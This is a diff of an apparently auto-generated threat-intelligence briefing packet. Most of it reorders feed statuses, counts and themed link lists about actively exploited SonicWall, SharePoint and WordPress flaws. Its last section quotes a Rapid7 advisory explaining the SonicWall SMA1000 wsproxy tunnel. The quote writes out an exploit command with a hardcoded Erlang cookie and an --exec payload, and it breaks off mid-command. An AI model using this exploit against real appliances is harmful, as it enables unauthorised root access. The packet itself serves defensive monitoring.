@@ -1,13 +1,13 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-07-21T16:27:26.976238+00:00
+- Generated: 2026-07-21T18:19:38.521109+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
 - Feeds OK: 77
 - Total items in window: 343
-- Total clusters raw: 151
-- Total clusters in packet: 72
+- Total clusters raw: 152
+- Total clusters in packet: 73
 - Dropped low score: 79
 - Dropped overflow: 0
 
@@ -70,16 +70,16 @@
 
 ## Feed status
 
+- **Unit 42** (threat_research_primary)
+  - URL: https://unit42.paloaltonetworks.com/feed/
+  - Status: ok
+  - Item count: 15
+  - In window count: 4
 - **CrowdStrike** (threat_research_primary)
   - URL: https://www.crowdstrike.com/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **SentinelOne Labs** (threat_research_primary)
-  - URL: https://www.sentinelone.com/labs/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **Microsoft Security Blog** (threat_research_primary)
   - URL: https://www.microsoft.com/en-us/security/blog/feed/
   - Status: ok
@@ -90,40 +90,40 @@
   - Status: ok
   - Item count: 25
   - In window count: 0
-- **Unit 42** (threat_research_primary)
-  - URL: https://unit42.paloaltonetworks.com/feed/
-  - Status: ok
-  - Item count: 15
-  - In window count: 4
 - **Google Threat Analysis Group** (threat_research_primary)
   - URL: https://blog.google/threat-analysis-group/rss/
   - Status: parse_error
   - Item count: 0
   - In window count: 0
+- **SentinelOne Labs** (threat_research_primary)
+  - URL: https://www.sentinelone.com/labs/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
 - **Sekoia** (threat_research_primary)
   - URL: https://blog.sekoia.io/feed/
   - Status: parse_error
   - Item count: 0
   - In window count: 0
-- **Cisco Talos** (threat_research_primary)
-  - URL: https://feeds.feedburner.com/feedburner/Talos
-  - Status: ok
-  - Item count: 15
-  - In window count: 4
 - **Microsoft Threat Intelligence** (threat_research_primary)
   - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
   - Status: ok
   - Item count: 10
   - In window count: 2
-- **NCSC UK** (government_authoritative)
-  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
 - **Citizen Lab** (threat_research_primary)
   - URL: https://citizenlab.ca/feed/
   - Status: ok
   - Item count: 10
+  - In window count: 1
+- **Cisco Talos** (threat_research_primary)
+  - URL: https://feeds.feedburner.com/feedburner/Talos
+  - Status: ok
+  - Item count: 15
+  - In window count: 4
+- **NCSC UK** (government_authoritative)
+  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
+  - Status: ok
+  - Item count: 20
   - In window count: 1
 - **Kaspersky Securelist** (threat_research_primary)
   - URL: https://securelist.com/feed/
@@ -140,45 +140,45 @@
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **Volexity** (threat_research_primary)
-  - URL: https://www.volexity.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **Horizon3 Attack Research** (offensive_vulnerability_research)
   - URL: https://horizon3.ai/feed/
   - Status: ok
   - Item count: 10
-  - In window count: 7
+  - In window count: 8
 - **ESET WeLiveSecurity** (threat_research_primary)
   - URL: https://www.welivesecurity.com/en/rss/feed/
   - Status: ok
   - Item count: 100
   - In window count: 0
-- **Assetnote** (offensive_vulnerability_research)
-  - URL: https://www.assetnote.io/resources/research/rss.xml
+- **Volexity** (threat_research_primary)
+  - URL: https://www.volexity.com/feed/
   - Status: ok
-  - Item count: 78
+  - Item count: 10
+  - In window count: 1
+- **GitHub Security Lab** (offensive_vulnerability_research)
+  - URL: https://github.blog/category/security/feed/
+  - Status: ok
+  - Item count: 10
   - In window count: 0
 - **Recorded Future** (threat_research_primary)
   - URL: https://www.recordedfuture.com/feed
   - Status: ok
   - Item count: 50
   - In window count: 4
-- **PortSwigger Research** (offensive_vulnerability_research)
-  - URL: https://portswigger.net/research/rss
-  - Status: ok
-  - Item count: 40
-  - In window count: 0
 - **Red Canary** (detection_response_operations)
   - URL: https://redcanary.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **GitHub Security Lab** (offensive_vulnerability_research)
-  - URL: https://github.blog/category/security/feed/
+- **Assetnote** (offensive_vulnerability_research)
+  - URL: https://www.assetnote.io/resources/research/rss.xml
   - Status: ok
-  - Item count: 10
+  - Item count: 78
+  - In window count: 0
+- **PortSwigger Research** (offensive_vulnerability_research)
+  - URL: https://portswigger.net/research/rss
+  - Status: ok
+  - Item count: 40
   - In window count: 0
 - **Exploit-DB** (offensive_vulnerability_research)
   - URL: https://www.exploit-db.com/rss.xml
@@ -195,13 +195,13 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Active Countermeasures** (detection_response_operations)
-  - URL: https://www.activecountermeasures.com/feed/
+- **Proofpoint Threat Insight** (detection_response_operations)
+  - URL: https://www.proofpoint.com/us/rss.xml
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Proofpoint Threat Insight** (detection_response_operations)
-  - URL: https://www.proofpoint.com/us/rss.xml
+- **Active Countermeasures** (detection_response_operations)
+  - URL: https://www.activecountermeasures.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 0
@@ -225,40 +225,40 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Datadog Security Labs** (cloud_identity_infrastructure)
-  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
-  - Status: ok
-  - Item count: 30
-  - In window count: 0
 - **Orca Security Research** (cloud_identity_infrastructure)
   - URL: https://orca.security/resources/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **AWS Security Blog** (cloud_identity_infrastructure)
-  - URL: https://aws.amazon.com/blogs/security/feed/
+- **Datadog Security Labs** (cloud_identity_infrastructure)
+  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
   - Status: ok
-  - Item count: 20
-  - In window count: 4
-- **Huntress** (detection_response_operations)
-  - URL: https://www.huntress.com/blog/rss.xml
-  - Status: ok
-  - Item count: 100
+  - Item count: 30
   - In window count: 0
 - **Trail of Bits** (offensive_vulnerability_research)
   - URL: https://blog.trailofbits.com/feed/
   - Status: ok
   - Item count: 20
   - In window count: 0
+- **AWS Security Blog** (cloud_identity_infrastructure)
+  - URL: https://aws.amazon.com/blogs/security/feed/
+  - Status: ok
+  - Item count: 20
+  - In window count: 5
+- **Permiso Security** (cloud_identity_infrastructure)
+  - URL: https://permiso.io/blog/rss.xml
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
 - **Rapid7** (offensive_vulnerability_research)
   - URL: https://www.rapid7.com/blog/rss/
   - Status: ok
   - Item count: 20
   - In window count: 8
-- **Permiso Security** (cloud_identity_infrastructure)
-  - URL: https://permiso.io/blog/rss.xml
+- **Huntress** (detection_response_operations)
+  - URL: https://www.huntress.com/blog/rss.xml
   - Status: ok
-  - Item count: 10
+  - Item count: 100
   - In window count: 0
 - **Google Cloud Threat Intelligence** (threat_research_primary)
   - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
@@ -285,31 +285,26 @@
   - Status: ok
   - Item count: 100
   - In window count: 4
-- **Cloudflare Radar** (cloud_identity_infrastructure)
-  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
 - **Coveware** (ransomware_ecrime_financial_crime)
   - URL: https://www.coveware.com/blog?format=rss
   - Status: parse_error
   - Item count: 0
   - In window count: 0
+- **Cloudflare Radar** (cloud_identity_infrastructure)
+  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
+  - Status: ok
+  - Item count: 20
+  - In window count: 1
+- **OpenSSF Blog** (ai_security_agentic_risk)
+  - URL: https://openssf.org/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 2
 - **Google DeepMind Blog** (ai_security_agentic_risk)
   - URL: https://deepmind.google/blog/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 3
-- **OpenSSF Blog** (ai_security_agentic_risk)
-  - URL: https://openssf.org/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
-- **Interconnects** (ai_security_agentic_risk)
-  - URL: https://www.interconnects.ai/feed
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
 - **Chainalysis** (ransomware_ecrime_financial_crime)
   - URL: https://www.chainalysis.com/blog/feed/
   - Status: ok
@@ -319,17 +314,22 @@
   - URL: https://cloudblog.withgoogle.com/rss/
   - Status: ok
   - Item count: 20
-  - In window count: 20
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - URL: https://www.bleepingcomputer.com/feed/
+  - In window count: 19
+- **Interconnects** (ai_security_agentic_risk)
+  - URL: https://www.interconnects.ai/feed
   - Status: ok
-  - Item count: 15
-  - In window count: 15
+  - Item count: 20
+  - In window count: 1
 - **The Record** (cyber_news_breach_reporting)
   - URL: https://therecord.media/feed
   - Status: ok
   - Item count: 5
   - In window count: 5
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - URL: https://www.bleepingcomputer.com/feed/
+  - Status: ok
+  - Item count: 15
+  - In window count: 15
 - **SecurityWeek** (cyber_news_breach_reporting)
   - URL: https://www.securityweek.com/feed/
   - Status: ok
@@ -350,50 +350,50 @@
   - Status: ok
   - Item count: 20
   - In window count: 0
-- **Simon Willison** (ai_security_agentic_risk)
-  - URL: https://simonwillison.net/atom/everything/
-  - Status: ok
-  - Item count: 30
-  - In window count: 27
 - **Dark Reading** (cyber_news_breach_reporting)
   - URL: https://www.darkreading.com/rss.xml
   - Status: ok
   - Item count: 50
+  - In window count: 24
+- **Simon Willison** (ai_security_agentic_risk)
+  - URL: https://simonwillison.net/atom/everything/
+  - Status: ok
+  - Item count: 30
   - In window count: 25
 - **Help Net Security** (cyber_news_breach_reporting)
   - URL: https://www.helpnetsecurity.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **Black Hills Information Security** (detection_response_operations)
-  - URL: https://www.blackhillsinfosec.com/feed/
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
-- **Troy Hunt** (practitioner_analysis)
-  - URL: https://www.troyhunt.com/rss/
-  - Status: ok
-  - Item count: 15
-  - In window count: 2
-- **Schneier on Security** (practitioner_analysis)
-  - URL: https://www.schneier.com/feed/atom/
-  - Status: ok
-  - Item count: 10
-  - In window count: 6
 - **Team Cymru** (ransomware_ecrime_financial_crime)
   - URL: https://www.team-cymru.com/post/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 1
+- **Krebs on Security** (practitioner_analysis)
+  - URL: https://krebsonsecurity.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
+- **Schneier on Security** (practitioner_analysis)
+  - URL: https://www.schneier.com/feed/atom/
+  - Status: ok
+  - Item count: 10
+  - In window count: 6
+- **Troy Hunt** (practitioner_analysis)
+  - URL: https://www.troyhunt.com/rss/
+  - Status: ok
+  - Item count: 15
+  - In window count: 2
 - **Reddit r/cybersecurity** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/cybersecurity/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Krebs on Security** (practitioner_analysis)
-  - URL: https://krebsonsecurity.com/feed/
+- **Black Hills Information Security** (detection_response_operations)
+  - URL: https://www.blackhillsinfosec.com/feed/
   - Status: ok
-  - Item count: 10
+  - Item count: 100
   - In window count: 1
 - **Reddit r/blueteamsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/blueteamsec/.rss
@@ -410,41 +410,41 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **The Hacker News** (cyber_news_breach_reporting)
-  - URL: https://feeds.feedburner.com/TheHackersNews
-  - Status: ok
-  - Item count: 50
-  - In window count: 50
-- **Reddit r/netsecstudents** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/netsecstudents/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
 - **Reddit r/AskNetsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/AskNetsec/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
+- **Reddit r/netsecstudents** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/netsecstudents/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
+- **The Hacker News** (cyber_news_breach_reporting)
+  - URL: https://feeds.feedburner.com/TheHackersNews
+  - Status: ok
+  - Item count: 50
+  - In window count: 50
 - **Graham Cluley** (practitioner_analysis)
   - URL: https://grahamcluley.com/feed/
   - Status: ok
   - Item count: 20
   - In window count: 4
-- **Infosecurity Magazine** (cyber_news_breach_reporting)
-  - URL: https://www.infosecurity-magazine.com/rss/news/
-  - Status: ok
-  - Item count: 100
-  - In window count: 26
 - **Intel 471** (ransomware_ecrime_financial_crime)
   - URL: https://intel471.com/blog/feed
   - Status: ok
   - Item count: 100
   - In window count: 3
+- **Infosecurity Magazine** (cyber_news_breach_reporting)
+  - URL: https://www.infosecurity-magazine.com/rss/news/
+  - Status: ok
+  - Item count: 100
+  - In window count: 26
 - **Reddit r/netsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/netsec/.rss
   - Status: ok
   - Item count: 25
-  - In window count: 21
+  - In window count: 22
 - **Embrace the Red** (ai_security_agentic_risk)
   - URL: https://embracethered.com/blog/index.xml
   - Status: ok
@@ -473,43 +473,6 @@
 
 ## Affinity groups (themes)
 
-### Microsoft SharePoint active exploitation
-- Anchor signal: Microsoft SharePoint
-- Theme key: microsoft-sharepoint
-- Cluster count: 7
-- Article count: 23
-- Cohesion: 0.214
-- Shared strong signals: Microsoft SharePoint
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: active_exploitation, zero_day, data_breach
-  - affected_industries: manufacturing_industrial, financial_services
-  - affected_products: Microsoft SharePoint, WordPress
-  - cve_ids: CVE-2026-56164
-  - urgency_signals: preauth_unauth, actively_exploited, zero_day
-- Cluster IDs: c951fa224e, 8c3fd723aa, 23d8608b27, 8f654ac030, 2bab6cab95, 46fba7fb46, ed4aa2806d
-- Links:
-  - https://www.rapid7.com/blog/post/etr-rapid7-mdr-team-discovers-new-sonicwall-sma1000-zero-days-being-actively-exploited-cve-2026-15409-cve-2026-15410
-  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-15409-cve-2026-15410/
-  - https://www.helpnetsecurity.com/2026/07/21/sonicwall-sma-zero-days-exploited-cve-2026-15409-cve-2026-15410/
-  - https://www.volexity.com/blog/2026/07/17/proxying-to-compromise-sonicwall-secure-mobile-access-0-day-exploitation/
-  - https://www.bleepingcomputer.com/news/security/sonicwall-sma1000-flaws-exploited-as-zero-days-to-push-custom-malware/
-  - https://www.sophos.com/en-us/blog/sonicwall-sma1000-vulnerabilities-in-active-exploitation
-  - https://thehackernews.com/2026/07/weekly-recap-wordpress-rce-sonicwall-0.html
-  - https://cyberscoop.com/sonicwall-zero-day-vulnerabilities-exploited/
-  - https://www.darkreading.com/vulnerabilities-threats/inc-ransomware-exploits-sonicwall-sma-zero-days
-  - https://www.rapid7.com/blog/post/etr-cve-2026-58644-microsoft-sharepoint-server-unauthenticated-remote-code-execution-vulnerability-exploited-in-the-wild
-  - https://orca.security/resources/blog/microsoft-july-2026-patch-tuesday-sharepoint-zero-day/
-  - https://thehackernews.com/2026/07/cisa-adds-exploited-sharepoint-rce-zero.html
-  - https://www.microsoft.com/en-us/security/blog/2026/07/16/acr-stealer-two-observed-intrusion-chains-amid-increased-threat-activity/
-  - https://www.securityweek.com/exploitation-of-servicenow-vulnerability-seen-days-after-disclosure/
-  - https://thehackernews.com/2026/07/critical-servicenow-ai-platform-flaw.html
-  - https://blog.talosintelligence.com/microsoft-patch-tuesday-july-2026/
-  - https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/
-  - https://www.securityweek.com/estee-lauder-discloses-impact-from-oracle-ebs-zero-day-hack/
-  - https://www.securityweek.com/clover-health-investments-discloses-data-breach/
-
 ### WordPress active exploitation
 - Anchor signal: WordPress
 - Theme key: wordpress
@@ -533,7 +496,6 @@
   - https://www.bleepingcomputer.com/news/security/sonicwall-sma1000-flaws-exploited-as-zero-days-to-push-custom-malware/
   - https://www.sophos.com/en-us/blog/sonicwall-sma1000-vulnerabilities-in-active-exploitation
   - https://thehackernews.com/2026/07/weekly-recap-wordpress-rce-sonicwall-0.html
-  - https://cyberscoop.com/sonicwall-zero-day-vulnerabilities-exploited/
   - https://www.darkreading.com/vulnerabilities-threats/inc-ransomware-exploits-sonicwall-sma-zero-days
   - https://www.wiz.io/blog/wp2shell-cve-2026-63030-cve-2026-60137
   - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-60137-cve-2026-63030/
@@ -541,6 +503,7 @@
   - https://isc.sans.edu/diary/rss/33168
   - https://thehackernews.com/2026/07/wordpress-wp2shell-exploitation-grows.html
   - https://www.reddit.com/r/netsec/comments/1v07npi/wp2shell_cve202663030_preauth_rce_chain_in/
+  - https://www.bleepingcomputer.com/news/security/critical-wp2shell-wordpress-flaws-exploited-to-install-webshells/
   - https://www.darkreading.com/cyberattacks-data-breaches/wp2shell-millions-wordpress-sites-remote-takeover
   - https://www.infosecurity-magazine.com/news/researchers-wordpress-exploit/
   - https://www.securityweek.com/exploitation-of-servicenow-vulnerability-seen-days-after-disclosure/
@@ -549,11 +512,68 @@
   - https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/
   - https://www.securityweek.com/meta-pays-78000-bounty-for-vulnerability-exposing-customer-support-data/
 
+### Microsoft SharePoint active exploitation
+- Anchor signal: Microsoft SharePoint
+- Theme key: microsoft-sharepoint
+- Cluster count: 5
+- Article count: 20
+- Cohesion: 0.22
+- Shared strong signals: Microsoft SharePoint
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - threat_categories: active_exploitation
+  - affected_industries: manufacturing_industrial
+  - affected_products: Microsoft SharePoint, WordPress, SonicWall
+  - cve_ids: CVE-2026-56164, CVE-2026-15409, CVE-2026-56155
+  - urgency_signals: actively_exploited, preauth_unauth
+- Cluster IDs: c951fa224e, 8c3fd723aa, 23d8608b27, 8f654ac030, 2bab6cab95
+- Links:
+  - https://www.rapid7.com/blog/post/etr-rapid7-mdr-team-discovers-new-sonicwall-sma1000-zero-days-being-actively-exploited-cve-2026-15409-cve-2026-15410
+  - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-15409-cve-2026-15410/
+  - https://www.helpnetsecurity.com/2026/07/21/sonicwall-sma-zero-days-exploited-cve-2026-15409-cve-2026-15410/
+  - https://www.volexity.com/blog/2026/07/17/proxying-to-compromise-sonicwall-secure-mobile-access-0-day-exploitation/
+  - https://www.bleepingcomputer.com/news/security/sonicwall-sma1000-flaws-exploited-as-zero-days-to-push-custom-malware/
+  - https://www.sophos.com/en-us/blog/sonicwall-sma1000-vulnerabilities-in-active-exploitation
+  - https://thehackernews.com/2026/07/weekly-recap-wordpress-rce-sonicwall-0.html
+  - https://www.darkreading.com/vulnerabilities-threats/inc-ransomware-exploits-sonicwall-sma-zero-days
+  - https://www.rapid7.com/blog/post/etr-cve-2026-58644-microsoft-sharepoint-server-unauthenticated-remote-code-execution-vulnerability-exploited-in-the-wild
+  - https://orca.security/resources/blog/microsoft-july-2026-patch-tuesday-sharepoint-zero-day/
+  - https://thehackernews.com/2026/07/cisa-adds-exploited-sharepoint-rce-zero.html
+  - https://www.microsoft.com/en-us/security/blog/2026/07/16/acr-stealer-two-observed-intrusion-chains-amid-increased-threat-activity/
+  - https://www.securityweek.com/exploitation-of-servicenow-vulnerability-seen-days-after-disclosure/
+  - https://thehackernews.com/2026/07/critical-servicenow-ai-platform-flaw.html
+  - https://blog.talosintelligence.com/microsoft-patch-tuesday-july-2026/
+  - https://research.checkpoint.com/2026/20th-july-threat-intelligence-report/
+
+### Microsoft 365 active exploitation
+- Anchor signal: Microsoft 365
+- Theme key: microsoft-365
+- Cluster count: 6
+- Article count: 6
+- Cohesion: 0.237
+- Shared strong signals: Microsoft 365
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - threat_categories: zero_day, active_exploitation, phishing_social_eng, data_breach
+  - affected_industries: manufacturing_industrial
+  - affected_products: Microsoft 365
+  - urgency_signals: zero_day, actively_exploited
+- Cluster IDs: 3d70163861, 629e6024b5, 46fba7fb46, 593ff08377, ed4aa2806d, 2de7ac9412
+- Links:
+  - https://www.infosecurity-magazine.com/news/cisa-urgent-patch-fortinet/
+  - https://thehackernews.com/2026/07/new-7-zip-vulnerability-could-let.html
+  - https://www.securityweek.com/estee-lauder-discloses-impact-from-oracle-ebs-zero-day-hack/
+  - https://www.securityweek.com/meta-pays-78000-bounty-for-vulnerability-exposing-customer-support-data/
+  - https://www.securityweek.com/clover-health-investments-discloses-data-breach/
+  - https://thehackernews.com/2026/07/worlds-largest-ai-model-repository.html
+
 ### SonicWall active exploitation
 - Anchor signal: SonicWall
 - Theme key: sonicwall
 - Cluster count: 4
-- Article count: 14
+- Article count: 13
 - Cohesion: 0.243
 - Shared strong signals: SonicWall
 - Member CVEs: (none)
@@ -573,35 +593,11 @@
   - https://www.bleepingcomputer.com/news/security/sonicwall-sma1000-flaws-exploited-as-zero-days-to-push-custom-malware/
   - https://www.sophos.com/en-us/blog/sonicwall-sma1000-vulnerabilities-in-active-exploitation
   - https://thehackernews.com/2026/07/weekly-recap-wordpress-rce-sonicwall-0.html
-  - https://cyberscoop.com/sonicwall-zero-day-vulnerabilities-exploited/
   - https://www.darkreading.com/vulnerabilities-threats/inc-ransomware-exploits-sonicwall-sma-zero-days
   - https://www.securityweek.com/exploitation-of-servicenow-vulnerability-seen-days-after-disclosure/
   - https://thehackernews.com/2026/07/critical-servicenow-ai-platform-flaw.html
   - https://www.securityweek.com/meta-pays-78000-bounty-for-vulnerability-exposing-customer-support-data/
   - https://www.bleepingcomputer.com/news/security/est-e-lauder-discloses-data-breach-via-oracle-e-business-flaw/
-
-### Microsoft 365 active exploitation
-- Anchor signal: Microsoft 365
-- Theme key: microsoft-365
-- Cluster count: 6
-- Article count: 6
-- Cohesion: 0.217
-- Shared strong signals: Microsoft 365
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: zero_day, active_exploitation, phishing_social_eng, data_breach
-  - affected_industries: manufacturing_industrial
-  - affected_products: Microsoft 365
-  - urgency_signals: zero_day, actively_exploited
-- Cluster IDs: 3d70163861, 629e6024b5, 46fba7fb46, 593ff08377, ed4aa2806d, 2de7ac9412
-- Links:
-  - https://www.infosecurity-magazine.com/news/cisa-urgent-patch-fortinet/
-  - https://thehackernews.com/2026/07/new-7-zip-vulnerability-could-let.html
-  - https://www.securityweek.com/estee-lauder-discloses-impact-from-oracle-ebs-zero-day-hack/
-  - https://www.securityweek.com/meta-pays-78000-bounty-for-vulnerability-exposing-customer-support-data/
-  - https://www.securityweek.com/clover-health-investments-discloses-data-breach/
-  - https://thehackernews.com/2026/07/worlds-largest-ai-model-repository.html
 
 ### Microsoft Defender vulnerability activity
 - Anchor signal: Microsoft Defender
@@ -628,7 +624,7 @@
 - Anchor signal: Salesforce
 - Theme key: salesforce
 - Cluster count: 3
-- Article count: 8
+- Article count: 9
 - Cohesion: 0.261
 - Shared strong signals: Salesforce
 - Member CVEs: (none)
@@ -642,33 +638,11 @@
 - Links:
   - https://cloud.google.com/blog/products/identity-security/find-and-fix-software-vulnerabilities-with-codemender/
   - https://www.bleepingcomputer.com/news/security/cursor-codex-gemini-cli-antigravity-hit-by-sandbox-escapes/
-  - https://thehackernews.com/2026/07/russian-speaking-hacker-uses-google.html
+  - https://thehackernews.com/2026/07/google-launches-gemini-35-flash-cyber.html
   - https://deepmind.google/blog/introducing-gemini-3-5-flash-cyber/
   - https://thehackernews.com/2026/07/qilin-ransomware-attackers-exploit-pan.html
   - https://www.bleepingcomputer.com/news/security/critical-globalprotect-vpn-bug-now-exploited-in-ransomware-attacks/
   - https://thehackernews.com/2026/07/new-7-zip-vulnerability-could-let.html
-
-### Kubernetes active exploitation
-- Anchor signal: Kubernetes
-- Theme key: kubernetes
-- Cluster count: 3
-- Article count: 7
-- Cohesion: 0.245
-- Shared strong signals: Kubernetes
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: active_exploitation
-  - affected_products: Kubernetes
-  - urgency_signals: actively_exploited
-- Cluster IDs: 9e0819b3d1, 3fe79c75d4, 9454090822
-- Links:
-  - https://orca.security/resources/blog/cve-2026-42533-nginx-heap-buffer-overflow/
-  - https://thehackernews.com/2026/07/critical-nginx-vulnerability-can-crash.html
-  - https://www.rapid7.com/blog/post/dr-investigating-aws-persistence-mechanisms
-  - https://aws.amazon.com/blogs/security/introducing-the-amazon-guardduty-investigation-agent-on-demand-ai-powered-threat-assessment/
-  - https://thehackernews.com/2026/07/new-nadmesh-botnet-hunts-exposed-ai.html
-  - https://webflow.sysdig.com/blog/four-ways-ai-has-fundamentally-changed-the-threat-landscape-in-2026
 
 ### Cl0p exploitation (CVE-2025-61882)
 - Anchor signal: Cl0p
@@ -775,12 +749,28 @@
   - https://blog.talosintelligence.com/uat-11795-deploys-novel-starland-rat-and-bespoke-wldr-c2-implant-in-financially-motivated-campaign/
   - https://blog.talosintelligence.com/microsoft-patch-tuesday-july-2026/
 
+### AWS vulnerability activity
+- Anchor signal: AWS
+- Theme key: aws
+- Cluster count: 2
+- Article count: 7
+- Cohesion: 0.857
+- Shared strong signals: AWS
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - affected_products: AWS
+- Cluster IDs: 3fe79c75d4, f9bf33b9c9
+- Links:
+  - https://www.rapid7.com/blog/post/dr-investigating-aws-persistence-mechanisms
+  - https://aws.amazon.com/blogs/security/do-more-with-aws-waf-labels-using-dynamic-label-interpolation/
+  - https://thehackernews.com/2026/07/aws-kiro-flaw-let-poisoned-web-page.html
+  - https://thehackernews.com/2026/07/unpatched-shark-vacuum-flaw-could-let.html
+
 ## Forward signals
 
 ### Novelty
-- Novel cves: 2
-  - CVE-2026-50522 (first seen via Rapid7 at 2026-07-17T18:18:53+00:00, cluster 8c3fd723aa)
-  - CVE-2026-49176 (first seen via Reddit r/netsec at 2026-07-21T14:42:45+00:00, cluster 72ccba81bc)
+- Novel cves: 0
 - Novel actors: 0
 - Novel products: 0
 
@@ -838,7 +828,7 @@
   - Prior top products: Anthropic/Claude, Apple iOS/macOS, Microsoft SharePoint
 - **Cl0p** (cluster 46fba7fb46)
   - New industries: manufacturing_industrial
-  - New products: Microsoft SharePoint
+  - New products: (none)
   - Prior top industries: financial_services, government, healthcare
   - Prior top products: GitHub, Microsoft 365, SolarWinds
 
@@ -867,8 +857,8 @@
 - Published: 2026-07-15T16:19:26+00:00
 - Link: https://www.rapid7.com/blog/post/etr-rapid7-mdr-team-discovers-new-sonicwall-sma1000-zero-days-being-actively-exploited-cve-2026-15409-cve-2026-15410
 - Fetch status: ok
-- Member count: 10
-- Corroborating source count: 9
+- Member count: 9
+- Corroborating source count: 8
 - Strong signals: CVE-2026-15409, CVE-2026-15410, SonicWall
 
 #### Cluster taxonomy (union across members)
@@ -899,7 +889,7 @@ Overview On July 14, 2026, SonicWall published a security advisory addressing tw
 Back to Blog Vulnerabilities and Exploits Rapid7 MDR Team Discovers New SonicWall SMA1000 Zero Days being Actively Exploited (CVE-2026-15409, CVE-2026-15410) Rapid7 Jul 15, 2026 | Last updated on Jul 16, 2026 | 8 min read Overview On July 14, 2026, SonicWall published a security advisory addressing two vulnerabilities affecting SMA1000 Series remote access appliances, including the critical server-side request forgery (SSRF) vulnerability CVE-2026-15409 (CVSS 10.0) and the high-severity code injection vulnerability CVE-2026-15410 . The advisory urges customers to immediately apply the latest platform hotfix releases. Successful exploitation of CVE-2026-15409 permits an unauthenticated attacker to open a websocket-based tunnel to arbitrary localhost-only services, while CVE-2026-15410 is a local privilege escalation that permits an attacker with access to an internal service listening on port 8188 on localhost to execute arbitrary operating system commands as root via a malicious path traversal-based remove_hotfix workflow. Both vulnerabilities are being actively exploited in the wild. Prior to SonicWall’s official vulnerability disclosure, Rapid7’s Managed Detection and Response team observed active, targeted zero-day exploitation of internet-facing SMA 1000-series appliances. In the SonicWall advisory, exploitation in the wild was noted , and both CVE-2026-15409 and CVE-2026-15410 have been added to CISA's Known Exploited Vulnerabilities ( KEV ) catalog. Given the confirmed exploitation activity and the critical unauthenticated impact of the vulnerabilities, organizations should prioritize remediation of SMA1000 appliances on an emergency basis. Affected products include SonicWall SMA1000 Series models 6210, 7210, and 8200v running: 12.4.3-03245 12.4.3-03387 12.4.3-03434 (platform-hotfix) 12.5.0-02283 12.5.0-02624 12.5.0-02800 (platform-hotfix) These vulnerabilities do not affect SSL VPN functionality on SonicWall firewalls or the SMA 100 Series product line. Technical overview The primary vulnerability is in a websocket proxy feature, accessed via the path /wsproxy on the affected “SonicWall WorkPlace” application (served on port 443 by default). This feature permits a netcat-like TCP tunnel to arbitrary hosts and ports, which are provided by the user in URL parameters. By provided host values that point to localhost, the attacker can access local SonicWall appliance system services behind the firewall to send and receive arbitrary TCP traffic to and from them. This is the first-stage vulnerability, CVE-2026-15409, that Rapid7 MDR analysts are seeing attackers exploit in the wild. With this capability, an attacker can reach and exploit less-hardened services running on the appliance, such as the Erlang application on localhost:1050 or the ctrl-service application on localhost:8188. We developed an exploit targeting the Erlang process listening on localhost:1050 for remote code execution. Note that the provided cookie value is hardcoded for the Erlang process, based on our testing, so authentication is not required to establish code execution. # python3 cve-2026-15409.py --ws-url 'wss://192.168.1.46/wsproxy?bmID=-3389c1b25ccd&serviceType=SSH&host=0.0.0.0&port=1050' --ws-user-agent 'SMA Connect Agent' --ws-insecure-tls --cookie 10ecad5b446e86864832904cd439b6b70262 --exec 'whoami && id && pwd 